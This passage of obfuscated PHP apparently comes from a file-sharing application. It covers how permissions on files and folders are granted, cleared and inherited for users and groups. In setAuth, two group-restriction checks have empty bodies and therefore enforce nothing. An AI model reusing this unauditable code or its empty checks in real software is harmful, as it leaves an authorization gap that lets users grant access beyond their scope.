($şÅ‰êşş[$ÚÈ†šÈ[191]] == SourceModel::TYPE_USER && $şÅ‰êşş[$ÚÈ†šÈ[583]] == $ÚÈ†šÈ[231]) { $æ×ÌüË = 0; } $Ó¹ô‚–[] = $³€õïŞÚ[$ÚÈ†šÈ[499]] + $æ×ÌüË; } array_multisort($Ó¹ô‚–, SORT_DESC, $Å»­´ÌÁ); return $Å»­´ÌÁ; } public function sourceAuthSelect($šŠØ¾¨Ÿ) { $î±ñ¢øË =& $_SERVER[ˆö¿ÚÌ¼]; static $À°‡ÃÓÃ = array(); $Îú³©È… = is_array($šŠØ¾¨Ÿ) ? !1 : !0; if ($Îú³©È…) { $šŠØ¾¨Ÿ = array($šŠØ¾¨Ÿ); } $¼“‚å£Š = array(); foreach ($šŠØ¾¨Ÿ as $£Ï¼ªØÏ) { if (isset($À°‡ÃÓÃ[$£Ï¼ªØÏ])) { $¼“‚å£Š[$£Ï¼ªØÏ] = $À°‡ÃÓÃ[$£Ï¼ªØÏ]; } } if (count($¼“‚å£Š) == count($šŠØ¾¨Ÿ)) { return $Îú³©È… ? $¼“‚å£Š[$šŠØ¾¨Ÿ[0]] : $¼“‚å£Š; } $ÚÚ–ãÍ“ = $î±ñ¢øË[2175]; $‰¤Ç†ŒË = array($î±ñ¢øË[194] => array($î±ñ¢øË[7], $šŠØ¾¨Ÿ)); $ÏÌÊÌ‹š = $this->field($ÚÚ–ãÍ“)->order($î±ñ¢øË[478])->where($‰¤Ç†ŒË)->select(); $ÑíŠ»É• = array_to_keyvalue_group($ÏÌÊÌ‹š, $î±ñ¢øË[194]); foreach ($šŠØ¾¨Ÿ as $£Ï¼ªØÏ) { $À°‡ÃÓÃ[$£Ï¼ªØÏ] = $ÑíŠ»É•[$£Ï¼ªØÏ] ? $ÑíŠ»É•[$£Ï¼ªØÏ] : array(); } if ($Îú³©È…) { return $ÏÌÊÌ‹š; } return $ÑíŠ»É•; } public function setAuth($¹µ•Í Š, $ŠçŞ§ó¯) { $ŒÚ›À–Ú =& $_SERVER[ˆö¿ÚÌ¼]; $ºàÓéÀ = Model($ŒÚ›À–Ú[1435])->sourceInfo($¹µ•Í Š); if (!$ºàÓéÀ) { return !1; } if ($ºàÓéÀ[$ŒÚ›À–Ú[191]] != SourceModel::TYPE_GROUP) { return !1; } $ı„Ç¿Éâ = 1; $µø“¼à = $ºàÓéÀ[$ŒÚ›À–Ú[583]]; if ($µø“¼à != $ı„Ç¿Éâ) { $¼›À×şÄ = array($ŒÚ›À–Ú[1986] => $µø“¼à); $´è¸Á¢Å = Model($ŒÚ›À–Ú[2080])->field($ŒÚ›À–Ú[1785])->where($¼›À×şÄ)->select(); $´è¸Á¢Å = array_to_keyvalue($´è¸Á¢Å, $ŒÚ›À–Ú[12], $ŒÚ›À–Ú[1785]); } $Üö¦ø†¿ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ë¥õ©–É = array(); foreach ($ŠçŞ§ó¯ as $Áø’) { if (!in_array($Áø’[$ŒÚ›À–Ú[191]], $Üö¦ø†¿)) { show_json(LNG($ŒÚ›À–Ú[2176]), !1); } if ($µø“¼à != $ı„Ç¿Éâ) { if ($Áø’[$ŒÚ›À–Ú[191]] == SourceModel::TYPE_GROUP) { } if ($Áø’[$ŒÚ›À–Ú[583]] != 0 && !in_array($Áø’[$ŒÚ›À–Ú[583]], $´è¸Á¢Å)) { } } if ($Áø’[$ŒÚ›À–Ú[583]] == 0) { $Áø’[$ŒÚ›À–Ú[191]] = SourceModel::TYPE_USER; } $ë¥õ©–É[] = array($ŒÚ›À–Ú[194] => $¹µ•Í Š, $ŒÚ›À–Ú[191] => intval($Áø’[$ŒÚ›À–Ú[191]]), $ŒÚ›À–Ú[583] => intval($Áø’[$ŒÚ›À–Ú[583]]), $ŒÚ›À–Ú[2094] => intval($Áø’[$ŒÚ›À–Ú[2094]]) ? intval($Áø’[$ŒÚ›À–Ú[2094]]) : 0, $ŒÚ›À–Ú[2158] => intval($Áø’[$ŒÚ›À–Ú[2158]]) ? intval($Áø’[$ŒÚ›À–Ú[2158]]) : -1); } $this->where(array($ŒÚ›À–Ú[503] => $¹µ•Í Š))->delete(); $this->addAll($ë¥õ©–É); return !0; } public function authClear($Šøäı«à) { $¶ªÊÜÏŞ =& $_SERVER[ˆö¿ÚÌ¼]; $Ííƒ˜»´ = Model($¶ªÊÜÏŞ[1435])->sourceInfo($Šøäı«à); $ñÕ¯ô±ì = array($Šøäı«à); if ($Ííƒ˜»´[$¶ªÊÜÏŞ[497]] == $¶ªÊÜÏŞ[91]) { $êæ•óâ‹ = array($¶ªÊÜÏŞ[669] => array($¶ªÊÜÏŞ[629], $Ííƒ˜»´[$¶ªÊÜÏŞ[598]] . $Šøäı«à . $¶ªÊÜÏŞ[630])); $ñÕ¯ô±ì = Model($¶ªÊÜÏŞ[1435])->field($¶ªÊÜÏŞ[503])->where($êæ•óâ‹)->getField($¶ªÊÜÏŞ[194], !0); $ñÕ¯ô±ì[] = $Šøäı«à; } $this->where(array($¶ªÊÜÏŞ[503] => array($¶ªÊÜÏŞ[504], $ñÕ¯ô±ì)))->delete(); return !0; } public function getAllChildren($ó˜Ÿ©ŠÛ) { $›éã „§ =& $_SERVER[ˆö¿ÚÌ¼]; $¦Šª´Ñ‚ = Model($›éã „§[1435])->sourceInfo($ó˜Ÿ©ŠÛ); if ($¦Šª´Ñ‚[$›éã „§[497]] != $›éã „§[91]) { return $this->sourceListAuth(array($ó˜Ÿ©ŠÛ)); } if ($¦Šª´Ñ‚[$›éã „§[191]] != SourceModel::TYPE_GROUP) { return array(); } $ò´Îü”Ì = 1; $¬¦î®åŞ = array($ó˜Ÿ©ŠÛ); if ($¦Šª´Ñ‚[$›éã „§[193]] == $›éã „§[231] && $¦Šª´Ñ‚[$›éã „§[583]] != $ò´Îü”Ì) { $¬¦î®åŞ = $this->groupChidldAllRootSource($¦Šª´Ñ‚[$›éã „§[583]]); } $Ûğò¥ù = $this->field($›éã „§[194])->group($›éã „§[194])->select(); $Ûğò¥ù = array_to_keyvalue($Ûğò¥ù, $›éã „§[12], $›éã „§[194]); if (!$Ûğò¥ù) { return array(); } $ò­å×»Ï = $›éã „§[2177]; $í‡ºáÊĞ = array($›éã „§[194] => array($›éã „§[7], $Ûğò¥ù), $›éã „§[517] => $›éã „§[231]); $ÔÍŞÔ§¾ = Model($›éã „§[915])->field($ò­å×»Ï)->where($í‡ºáÊĞ)->select(); $†„©ÄÉ = array($ó˜Ÿ©ŠÛ); foreach ($ÔÍŞÔ§¾ as $ÂÕ®°´) { foreach ($¬¦î®åŞ as $æí¤Êş) { $©„ŠÎ¬ = $›éã „§[50] . $æí¤Êş . $›éã „§[50]; $¨ïó = $ÂÕ®°´[$›éã „§[598]] . $ÂÕ®°´[$›éã „§[194]] . $›éã „§[50]; if (strstr($¨ïó, $©„ŠÎ¬)) { $†„©ÄÉ[] = $ÂÕ®°´[$›éã „§[194]]; break; } } } return $this->sourceListAuth($†„©ÄÉ); } private function sourceListAuth($®Ğı—Çä) { $§˜‘Œ…Í =& $_SERVER[ˆö¿ÚÌ¼]; $ÁšèïœÅ = Model($§˜‘Œ…Í[1435])->sourceListInfo($®Ğı—Çä, !0); $˜ñ‚ø‰ù = $this->sourceAuthSelect($®Ğı—Çä); $‹¾÷şÖà = array(); $ÒÊ×ôä‚ = array(); foreach ($ÁšèïœÅ as $©Œç®Î£) { unset($©Œç®Î£[$§˜‘Œ…Í[541]]); unset($©Œç®Î£[$§˜‘Œ…Í[539]]); unset($©Œç®Î£[$§˜‘Œ…Í[499]]); unset($©Œç®Î£[$§˜‘Œ…Í[90]]); $Êß¤İÂö = $˜ñ‚ø‰ù[$©Œç®Î£[$§˜‘Œ…Í[194]]]; if (!$Êß¤İÂö) { continue; } $©Œç®Î£[$§˜‘Œ…Í[2178]] = $this->authTargetInfo($Êß¤İÂö); $©Œç®Î£[$§˜‘Œ…Í[596]] = rtrim($©Œç®Î£[$§˜‘Œ…Í[602]], $§˜‘Œ…Í[8]) . $§˜‘Œ…Í[8] . ltrim($©Œç®Î£[$§˜‘Œ…Í[596]], $§˜‘Œ…Í[8]); $‹¾÷şÖà[] = $©Œç®Î£; $ÍÄåÓŞÆ = count(explode($§˜‘Œ…Í[8], trim($©Œç®Î£[$§˜‘Œ…Í[596]], $§˜‘Œ…Í[8]))); $ÒÊ×ôä‚[] = $ÍÄåÓŞÆ + ($©Œç®Î£[$§˜‘Œ…Í[33]] == $§˜‘Œ…Í[78] ? 0 : 1000); } array_multisort($ÒÊ×ôä‚, SORT_ASC, $‹¾÷şÖà); return $‹¾÷şÖà; } private function groupChidldAllRootSource($Š—µâÉ) { $ª÷ÕŸ´ =& $_SERVER[ˆö¿ÚÌ¼]; $¡Ì ¿ıà = Model($ª÷ÕŸ´[2179])->groupChildrenAll($Š—µâÉ); $‰Ø½÷Ç¯ = array($ª÷ÕŸ´[193] => 0, $ª÷ÕŸ´[583] => array($ª÷ÕŸ´[7], $¡Ì ¿ıà), $ª÷ÕŸ´[191] => SourceModel::TYPE_GROUP); $Èä¬»Öö = Model($ª÷ÕŸ´[915])->field($ª÷ÕŸ´[194])->where($‰Ø½÷Ç¯)->select(); $Èä¬»Öö = array_to_keyvalue($Èä¬»Öö, $ª÷ÕŸ´[12], $ª÷ÕŸ´[194]); return $Èä¬»Öö; } private function authTargetInfo($®™œâŸä) { $›¼¥âóÈ =& $_SERVER[ˆö¿ÚÌ¼]; $øğçÍ¡é = array(); $ØñğÂÄ = array(); $ˆª“ë’ = 2 << 25; foreach ($®™œâŸä as $÷Ñ”®§) { $Œ…´ºÇè = Model($›¼¥âóÈ[585])->listData($÷Ñ”®§[$›¼¥âóÈ[2094]]); if (!$Œ…´ºÇè) { continue; } if ($÷Ñ”®§[$›¼¥âóÈ[191]] == SourceModel::TYPE_USER) { $‘ºêæˆ§ = Model($›¼¥âóÈ[591])->getInfoSimpleOuter($÷Ñ”®§[$›¼¥âóÈ[583]]); if ($‘ºêæˆ§[$›¼¥âóÈ[1785]] == $›¼¥âóÈ[1287]) { continue; } if ($‘ºêæˆ§[$›¼¥âóÈ[1785]] == $›¼¥âóÈ[231]) { $‘ºêæˆ§[$›¼¥âóÈ[32]] = LNG($›¼¥âóÈ[2180]); } } else { $‘ºêæˆ§ = Model($›¼¥âóÈ[599])->getInfoSimple($÷Ñ”®§[$›¼¥âóÈ[583]]); } if (!$‘ºêæˆ§) { continue; } $‘ºêæˆ§[$›¼¥âóÈ[554]] = $Œ…´ºÇè; $øğçÍ¡é[] = $‘ºêæˆ§; $«¯›Ëâû = 0; if ($÷Ñ”®§[$›¼¥âóÈ[191]] == SourceModel::TYPE_GROUP) { $«¯›Ëâû = $ˆª“ë’ * 2; } if ($÷Ñ”®§[$›¼¥âóÈ[191]] == SourceModel::TYPE_USER) { $«¯›Ëâû = $ˆª“ë’; } if ($÷Ñ”®§[$›¼¥âóÈ[191]] == SourceModel::TYPE_USER && $÷Ñ”®§[$›¼¥âóÈ[583]] == $›¼¥âóÈ[231]) { $«¯›Ëâû = 0; } $ØñğÂÄ[] = $Œ…´ºÇè[$›¼¥âóÈ[499]] + $«¯›Ëâû; } array_multisort($ØñğÂÄ, SORT_DESC, $øğçÍ¡é); return $øğçÍ¡é; } public function getAllChildrenByUser($âä§„·ª, $ÜÉˆÊ£) { $«™‡ =& $_SERVER[ˆö¿ÚÌ¼]; $ìºÙ¶¶è = Model($«™‡[611])->getInfo($ÜÉˆÊ£); if (!$ÜÉˆÊ£ || !$âä§„·ª || !$ìºÙ¶¶è) { return array(); } $ø©½àÎì = Model($«™‡[1435])->sourceInfo($âä§„·ª); $ìì›¯İİ = array(); $¸ÏÖ×á† = 1; if ($ø©½àÎì[$«™‡[193]] == $«™‡[231] && $ø©½àÎì[$«™‡[583]] != $¸ÏÖ×á† && $this->groupContainUser($ø©½àÎì[$«™‡[583]], $ÜÉˆÊ£)) { foreach ($ìºÙ¶¶è[$«™‡[2181]] as $©ªÇ—îæ) { $ëÏÂÉ = Model($«™‡[599])->getInfo($©ªÇ—îæ[$«™‡[1986]]); $÷•¼ÕäÖ = Model($«™‡[611])->getInfoSimpleOuter($ÜÉˆÊ£); $÷•¼ÕäÖ[$«™‡[554]] = $©ªÇ—îæ[$«™‡[499]]; if (Model($«™‡[585])->authCheckAction($©ªÇ—îæ[$«™‡[499]][$«™‡[499]], $«™‡[2007])) { continue; } $Ù‚©ƒÃ = array($«™‡[32] => $«™‡[1307] . $ëÏÂÉ[$«™‡[32]], $«™‡[194] => $ëÏÂÉ[$«™‡[90]][$«™‡[194]], $«™‡[87] => KodIO::make($ëÏÂÉ[$«™‡[90]][$«™‡[194]]), $«™‡[193] => $«™‡[231], $«™‡[191] => $«™‡[592], $«™‡[33] => $«™‡[633], $«™‡[596] => $ëÏÂÉ[$«™‡[603]], $«™‡[1986] => $ëÏÂÉ[$«™‡[1986]], $«™‡[600] => $ëÏÂÉ[$«™‡[193]], $«™‡[2178] => array($÷•¼ÕäÖ)); $ìì›¯İİ[$Ù‚©ƒÃ[$«™‡[194]]] = $Ù‚©ƒÃ; } } $Øí¡ùç« = array(); $à¡„Õ†Ÿ = $this->getAllChildren($âä§„·ª); foreach ($à¡„Õ†Ÿ as $É½±¡€€) { $»™éÃÀ‚ = !1; foreach ($É½±¡€€[$«™‡[2178]] as $»ÔóÁ) { if ($»ÔóÁ[$«™‡[1785]]) { if ($»ÔóÁ[$«™‡[1785]] == $ÜÉˆÊ£) { $»™éÃÀ‚ = !0; break; } } if ($»ÔóÁ[$«™‡[1986]]) { if ($this->groupContainUser($»ÔóÁ[$«™‡[1986]], $ÜÉˆÊ£)) { $»™éÃÀ‚ = !0; break; } } } if ($»™éÃÀ‚) { $Øí¡ùç«[] = $É½±¡€€; } $Šî‹Ö½º = $É½±¡€€[$«™‡[194]]; if (isset($ìì›¯İİ[$Šî‹Ö½º])) { $É½±¡€€[$«™‡[2178]][] = $ìì›¯İİ[$Šî‹Ö½º][0]; $ìì›¯İİ[$Šî‹Ö½º] = !1; } } $ìì›¯İİ = array_filter(array_values($ìì›¯İİ)); $Øí¡ùç« = array_merge($ìì›¯İİ, $Øí¡ùç«); return $Øí¡ùç«; } public function setAllChildrenByUser($ü·«´é, $¼·Ñğ”Ñ, $ü¯ÊÁù›) { $Ü°ï  =& $_SERVER[ˆö¿ÚÌ¼]; $¬¹´±î¿ = $this->getAllChildrenByUser($ü·«´é, $¼·Ñğ”Ñ); if (!$ü¯ÊÁù› || !$¬¹´±î¿) { return !1; } foreach ($¬¹´±î¿ as $³–û³µİ) { $¥ÙûÂ›Ñ = array(); foreach ($³–û³µİ[$Ü°ï [2178]] as $ÙŠÖ¬àà) { $‡òªõÑ÷ = $ÙŠÖ¬àà[$Ü°ï [554]]; $íó†òÅÍ = $ÙŠÖ¬àà[$Ü°ï [1785]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $†­¡“È = $ÙŠÖ¬àà[$Ü°ï [1785]] ? $ÙŠÖ¬àà[$Ü°ï [1785]] : $ÙŠÖ¬àà[$Ü°ï [1986]]; if ($ÙŠÖ¬àà[$Ü°ï [1785]] && $ÙŠÖ¬àà[$Ü°ï [1785]] == $¼·Ñğ”Ñ) { continue; } $¥ÙûÂ›Ñ[] = array($Ü°ï [194] => $³–û³µİ[$Ü°ï [194]], $Ü°ï [191] => $íó†òÅÍ, $Ü°ï [583] => intval($†­¡“È), $Ü°ï [2094] => isset($‡òªõÑ÷[$Ü°ï [478]]) ? intval($‡òªõÑ÷[$Ü°ï [478]]) : 0, $Ü°ï [2158] => isset($‡òªõÑ÷[$Ü°ï [2158]]) ? intval($‡òªõÑ÷[$Ü°ï [2158]]) : -1); } $¥ÙûÂ›Ñ[] = array($Ü°ï [194] => $³–û³µİ[$Ü°ï [194]], $Ü°ï [191] => SourceModel::TYPE_USER, $Ü°ï [583] => intval($¼·Ñğ”Ñ), $Ü°ï [2094] => intval($ü¯ÊÁù›), $Ü°ï [2158] => -1); $this->where(array($Ü°ï [503] => $³–û³µİ[$Ü°ï [194]]))->delete(); $this->addAll($¥ÙûÂ›Ñ); } return !0; } public function get($Ÿûå„Íá) { $ü §¬Á‚ = $this->getSourceList(array($Ÿûå„Íá), !0); return $ü §¬Á‚[0]; } public function getSourceList($¬—şÎÔÍ, $šĞ–§² = false, $±¥‡ÄÔ‚ = false) { $ê†ÀÌå´ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$¬—şÎÔÍ) { return array(); } $Õı¹»ë½ = Model($ê†ÀÌå´[1435]); if (!$šĞ–§² && count($¬—şÎÔÍ) == 1) { $šĞ–§² = array(); $šĞ–§²[$¬—şÎÔÍ[0]] = $Õı¹»ë½->sourceInfo($¬—şÎÔÍ[0]); } if (!$šĞ–§²) { $¯©ûÊİË = array($ê†ÀÌå´[503] => array($ê†ÀÌå´[504], $¬—şÎÔÍ)); $šĞ–§² = $Õı¹»ë½->field($ê†ÀÌå´[2182])->where($¯©ûÊİË)->select(); $šĞ–§² = array_to_keyvalue($šĞ–§², $ê†ÀÌå´[194]); } $ÕÏÊ„ã» = $¬—şÎÔÍ; foreach ($šĞ–§² as $©Ó‹‚Î => $÷€Î‘¬ø) { $¦ÉÚëñà = $Õı¹»ë½->parentLevelArray($÷€Î‘¬ø[$ê†ÀÌå´[598]]); $ÕÏÊ„ã» = array_merge($ÕÏÊ„ã», array($©Ó‹‚Î), array_reverse($¦ÉÚëñà)); } $ÕÏÊ„ã» = array_values(array_unique($ÕÏÊ„ã»)); if (!$ÕÏÊ„ã») { return array(); } $¤¢¬İÓ = $this->sourceAuthSelect($ÕÏÊ„ã»); $³Óí¶¦± = array(); foreach ($ÕÏÊ„ã» as $³ûÚáŒ—) { if (isset($¤¢¬İÓ[$³ûÚáŒ—])) { $³Óí¶¦±[$³ûÚáŒ—] = $¤¢¬İÓ[$³ûÚáŒ—]; } } $¢³±úæú = $this->userIsRoot($±¥‡ÄÔ‚); $¯´º™ï = AuthModel::authAll(); $ºÁÕî´« = array($ê†ÀÌå´[500] => $¯´º™ï, $ê†ÀÌå´[2183] => array($ê†ÀÌå´[505] => 0, $ê†ÀÌå´[1992] => $¯´º™ï, $ê†ÀÌå´[506] => LNG($ê†ÀÌå´[2184]), $ê†ÀÌå´[2009] => $ê†ÀÌå´[2185])); $–Ã˜ßĞ’ = array(); foreach ($šĞ–§² as $³ûÚáŒ— => $‚ŸëæéÍ) { if ($¢³±úæú && $GLOBALS[$ê†ÀÌå´[6]][$ê†ÀÌå´[2005]]) { $–Ã˜ßĞ’[$³ûÚáŒ—] = $ºÁÕî´«; continue; } $–Ã˜ßĞ’[$³ûÚáŒ—] = $this->makeSourceAuth($‚ŸëæéÍ, $³Óí¶¦±, $±¥‡ÄÔ‚); } return $–Ã˜ßĞ’; } public function authDeepCheck($‰ôã¼î€, $¢Âíğ³ş = false) { $”åüÕÕ² =& $_SERVER[ˆö¿ÚÌ¼]; $¢Âíğ³ş = $¢Âíğ³ş ? $¢Âíğ³ş : USER_ID; $´•’´â = $this->makeAuthDeep($¢Âíğ³ş); if (!in_array($‰ôã¼î€, $´•’´â[$”åüÕÕ²[2186]])) { return !1; } $Â¬Šè’à = array(); foreach ($´•’´â[$”åüÕÕ²[2187]] as $ÓÕ÷×òŒ => $‹¹¦ş¢‡) { if (!in_array($‰ôã¼î€, $‹¹¦ş¢‡)) { continue; } $Â¬Šè’à[] = $ÓÕ÷×òŒ; } if (!$Â¬Šè’à) { return !1; } $µƒÅ£¾š = $Â¬Šè’à ? $Â¬Šè’à[0] : $‰ôã¼î€; return array($”åüÕÕ²[500] => -1, $”åüÕÕ²[554] => array($”åüÕÕ²[505] => $”åüÕÕ²[1287], $”åüÕÕ²[1992] => $”åüÕÕ²[231], $”åüÕÕ²[506] => LNG($”åüÕÕ²[2188]), $”åüÕÕ²[2009] => $”åüÕÕ²[2189]), $”åüÕÕ²[2190] => LNG($”åüÕÕ²[2191]), $”åüÕÕ²[2192] => $this->sourceAuthInfo($µƒÅ£¾š)); } protected function makeAuthDeep($àğ¸‘ØÔ = false) { $ø›ÑÔÌé =& $_SERVER[ˆö¿ÚÌ¼]; static $†¹Œãüå = array(); $àğ¸‘ØÔ = $àğ¸‘ØÔ ? $àğ¸‘ØÔ : USER_ID; if (isset($†¹Œãüå[$àğ¸‘ØÔ])) { return $†¹Œãüå[$àğ¸‘ØÔ]; } $†¥¦‹à¹ = Model($ø›ÑÔÌé[2193])->listData(); $¾¯ä‹Åå = array(); foreach ($†¥¦‹à¹ as $ËÄ ğ»è) { if ($ËÄ ğ»è[$ø›ÑÔÌé[499]] == 0 && $ËÄ ğ»è[$ø›ÑÔÌé[2008]] == $ø›ÑÔÌé[91]) { $¾¯ä‹Åå[] = $ËÄ ğ»è[$ø›ÑÔÌé[478]]; } } $ñøğÕ•û = $this->userGroupParents($àğ¸‘ØÔ); $×Ù¦İñ = array($ø›ÑÔÌé[191] => SourceModel::TYPE_USER, $ø›ÑÔÌé[583] => $àğ¸‘ØÔ); if ($ñøğÕ•û) { $×Ù¦İñ = array(array($ø›ÑÔÌé[191] => SourceModel::TYPE_USER, $ø›ÑÔÌé[583] => $àğ¸‘ØÔ), array($ø›ÑÔÌé[191] => SourceModel::TYPE_GROUP, $ø›ÑÔÌé[583] => array($ø›ÑÔÌé[504], $ñøğÕ•û)), $ø›ÑÔÌé[1091] => $ø›ÑÔÌé[2088]); } $Ÿ‰”áæ = $this->field($ø›ÑÔÌé[2194])->where($×Ù¦İñ)->select(); $¸½æ®¡Š = array(); $ÖŸ¤Îæ‹ = array_to_keyvalue_group($Ÿ‰”áæ, $ø›ÑÔÌé[194]); foreach ($ÖŸ¤Îæ‹ as $Ï®Ï«óÇ => $°¿ ¼Š¼) { $Ö±¦öÔ = $this->authArrayCheck($°¿ ¼Š¼, $àğ¸‘ØÔ); if ($Ö±¦öÔ[$ø›ÑÔÌé[500]] > 0) { $¸½æ®¡Š[] = $Ï®Ï«óÇ . $ø›ÑÔÌé[12]; } } if ($ñøğÕ•û) { $Õ¨™í‹“ = Model($ø›ÑÔÌé[599]); foreach ($ñøğÕ•û as $Ò³îã¾´) { $ñª‰²Œ = $Õ¨™í‹“->getInfo($Ò³îã¾´); if (!$ñª‰²Œ || !is_array($ñª‰²Œ[$ø›ÑÔÌé[90]])) { continue; } $¸½æ®¡Š[] = $ñª‰²Œ[$ø›ÑÔÌé[90]][$ø›ÑÔÌé[194]]; } } $ˆÆı“€› = array(); $«åØ àÁ = $ñøğÕ•û; $·’ÉóŒî = Model($ø›ÑÔÌé[1435]); $Õ¨™í‹“ = Model($ø›ÑÔÌé[599]); $º°Öˆ²î = array(); $è¬óúÏÜ = array(); $çõ­ ß = array(); $÷‡„Î¨Ñ = array(); if ($¸½æ®¡Š) { $Õ‡İ¥É† = $·’ÉóŒî->where(array($ø›ÑÔÌé[194] => array($ø›ÑÔÌé[504], $¸½æ®¡Š)))->select(); foreach ($Õ‡İ¥É† as $ˆòê€) { if ($ˆòê€[$ø›ÑÔÌé[517]] == $ø›ÑÔÌé[91]) { continue; } $ŞáÀæ‹ö = $·’ÉóŒî->parentLevelArray($ˆòê€[$ø›ÑÔÌé[598]]); $ˆÆı“€› = array_merge($ˆÆı“€›, $ŞáÀæ‹ö); $«åØ àÁ[] = $ˆòê€[$ø›ÑÔÌé[583]]; $º°Öˆ²î[$ˆòê€[$ø›ÑÔÌé[194]]] = $ŞáÀæ‹ö; $è¬óúÏÜ[$ˆòê€[$ø›ÑÔÌé[194]]] = $ˆòê€[$ø›ÑÔÌé[583]]; } } $«åØ àÁ = array_values(array_unique($«åØ àÁ)); $¡‘‡¯­ = $«åØ àÁ; foreach ($¡‘‡¯­ as $Ò³îã¾´) { $ñª‰²Œ = $Õ¨™í‹“->getInfo($Ò³îã¾´); $ŞáÀæ‹ö = $·’ÉóŒî->parentLevelArray($ñª‰²Œ[$ø›ÑÔÌé[598]]); $«åØ àÁ = array_merge($«åØ àÁ, $ŞáÀæ‹ö); } $«åØ àÁ = array_values(array_unique($«åØ àÁ)); foreach ($«åØ àÁ as $Ò³îã¾´) { $ñª‰²Œ = $Õ¨™í‹“->getInfo($Ò³îã¾´); $ˆÆı“€›[] = $ñª‰²Œ[$ø›ÑÔÌé[90]][$ø›ÑÔÌé[194]]; $çõ­ ß[$Ò³îã¾´] = $ñª‰²Œ[$ø›ÑÔÌé[90]][$ø›ÑÔÌé[194]]; $÷‡„Î¨Ñ[$Ò³îã¾´] = $·’ÉóŒî->parentLevelArray($ñª‰²Œ[$ø›ÑÔÌé[598]]); } foreach ($º°Öˆ²î as $úÙÜÎûñ => $¯Æèú•) { $ÖäÔ—†ï = $è¬óúÏÜ[$úÙÜÎûñ]; if (!$ÖäÔ—†ï || !$çõ­ ß[$ÖäÔ—†ï]) { continue; } $®Åô¸İ = array(); foreach ($÷‡„Î¨Ñ[$ÖäÔ—†ï] as $Ò³îã¾´) { $®Åô¸İ[] = $çõ­ ß[$Ò³îã¾´]; } $º°Öˆ²î[$úÙÜÎûñ] = array_merge($®Åô¸İ, $¯Æèú•); } $ˆÆı“€› = array_values(array_unique($ˆÆı“€›)); $Äê¢Œëö = array($ø›ÑÔÌé[2186] => $ˆÆı“€›, $ø›ÑÔÌé[2187] => $º°Öˆ²î); $†¹Œãüå[$àğ¸‘ØÔ] = $Äê¢Œëö; return $Äê¢Œëö; } private function makeSourceAuth($éÅŞÍ, $ĞÓ•úç¶, $äÕ…˜¦Ò = false) { $«¸üØ¡Á =& $_SERVER[ˆö¿ÚÌ¼]; $à²¯©¦¶ = $«¸üØ¡Á[91]; $¹›êÍÏĞ = $éÅŞÍ[$«¸üØ¡Á[583]]; $ô“³ñ³ã = $éÅŞÍ[$«¸üØ¡Á[191]] == SourceModel::TYPE_GROUP; $øÉ¼ª = $ô“³ñ³ã ? $this->groupRootAuth($¹›êÍÏĞ, $äÕ…˜¦Ò) : !1; if ($øÉ¼ª && Model($«¸üØ¡Á[585])->authCheckAction($øÉ¼ª[$«¸üØ¡Á[499]], $«¸üØ¡Á[2007])) { return $this->groupAuthInfo($øÉ¼ª, $¹›êÍÏĞ); } $òˆË Œ = Model($«¸üØ¡Á[1435])->parentLevelArray($éÅŞÍ[$«¸üØ¡Á[598]]); $òˆË Œ = array_merge(array($éÅŞÍ[$«¸üØ¡Á[194]]), array_reverse($òˆË Œ)); $ ¨Ê†… = !1; foreach ($òˆË Œ as $ø’ä´Ïü) { if (!isset($ĞÓ•úç¶[$ø’ä´Ïü])) { continue; } $ÚŸøÓÃÈ = $this->authMake($ĞÓ•úç¶[$ø’ä´Ïü], $äÕ…˜¦Ò); if ($ÚŸøÓÃÈ[$«¸üØ¡Á[554]]) { $ ¨Ê†… = $ÚŸøÓÃÈ; break; } } if (!$ô“³ñ³ã) { return $ ¨Ê†…; } if (!$ ¨Ê†… && $øÉ¼ª) { $ ¨Ê†… = $this->groupAuthInfo($øÉ¼ª, $¹›êÍÏĞ); } if (!$ ¨Ê†…) { $˜èÊ²Ü = Model($«¸üØ¡Á[599])->getInfo($¹›êÍÏĞ); $»ËÂŞÙ¾ = explode($«¸üØ¡Á[50], trim($˜èÊ²Ü[$«¸üØ¡Á[598]], $«¸üØ¡Á[50])); $»ËÂŞÙ¾ = array_reverse($»ËÂŞÙ¾); foreach ($»ËÂŞÙ¾ as $·“ˆôÆ) { if ($·“ˆôÆ == $«¸üØ¡Á[231] || $·“ˆôÆ == $à²¯©¦¶) { continue; } $ÄéˆÇ×– = $this->groupRootAuth($·“ˆôÆ, $äÕ…˜¦Ò); if (!$ÄéˆÇ×–) { continue; } $ ¨Ê†… = $this->groupAuthInfo($ÄéˆÇ×–, $·“ˆôÆ); break; } } if (!$ ¨Ê†… || $ ¨Ê†…[$«¸üØ¡Á[500]] <= 0) { $ªÖ¹°‡ƒ = $this->authDeepCheck($éÅŞÍ[$«¸üØ¡Á[194]], $äÕ…˜¦Ò); if ($ªÖ¹°‡ƒ) { $ ¨Ê†… = $ªÖ¹°‡ƒ; } } return $ ¨Ê†…; } private function userIsRoot($²ø·„í‰ = false) { $Œõ¦½—­ =& $_SERVER[ˆö¿ÚÌ¼]; if (!$²ø·„í‰ && KodUser::isRoot()) { return !0; } $ó¼İÒµÏ = Model($Œõ¦½—­[611])->getInfo($²ø·„í‰); $š”Ë‚î¶ = Model($Œõ¦½—­[2195])->listData($ó¼İÒµÏ[$Œõ¦½—­[2196]]); if ($š”Ë‚î¶ && $š”Ë‚î¶[$Œõ¦½—­[589]][$Œõ¦½—­[2197]] == 1) { return !0; } return !1; } private function sourceAuthInfo($«¾Ñìî») { $¡ğÓŸÏ =& $_SERVER[ˆö¿ÚÌ¼]; $î†Æ“î­ = Model($¡ğÓŸÏ[1435]); $ğéŠñÒ¹ = $î†Æ“î­->sourceInfo($«¾Ñìî»); if (!$ğéŠñÒ¹) { return !1; } $î†Æ“î­->groupPathDisplay($ğéŠñÒ¹); $«æ›‘üÌ = array($ğéŠñÒ¹); $«æ›‘üÌ = $î†Æ“î­->_listAppendPath($«æ›‘üÌ); $ğéŠñÒ¹ = $«æ›‘üÌ[0]; $æäŠí = $ğéŠñÒ¹[$¡ğÓŸÏ[596]]; if (isset($ğéŠñÒ¹[$¡ğÓŸÏ[604]])) { $÷ä’š¿¾ = explode($¡ğÓŸÏ[8], trim($ğéŠñÒ¹[$¡ğÓŸÏ[596]], $¡ğÓŸÏ[8])); array_shift($÷ä’š¿¾); $æäŠí = $ğéŠñÒ¹[$¡ğÓŸÏ[602]] . $¡ğÓŸÏ[2198] . implode($¡ğÓŸÏ[8], $÷ä’š¿¾); } return array($¡ğÓŸÏ[506] => 